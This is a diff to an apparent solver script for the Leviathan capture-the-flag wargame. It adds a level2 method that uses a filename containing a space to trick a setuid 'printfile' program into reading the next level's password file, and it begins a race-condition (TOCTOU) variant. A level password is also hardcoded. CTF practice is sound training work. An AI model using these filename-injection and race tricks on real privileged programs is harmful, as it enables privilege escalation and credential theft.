@@ -64,8 +64,16 @@ class Solver(solver_util.AbstractSolver):
         proc.expect('password: ')
         proc.sendline('sex')
 
-
     def level2(self, proc):
+        proc.sendline(
+            'mkdir -p "/tmp/mss /etc/leviathan_pass/leviathan3" && '
+            'touch /tmp/mss && '
+            './printfile "/tmp/mss /etc/leviathan_pass/leviathan3"')
+        proc.expect(r'\$ ')
+        return proc.before.splitlines()[2]
+
+    def level2_alt(self, proc):
+        """Implements a TOCTOU solutions to level2."""
         proc.sendline(textwrap.dedent("""
             exploit() {
                 TEMP=`mktemp -d`
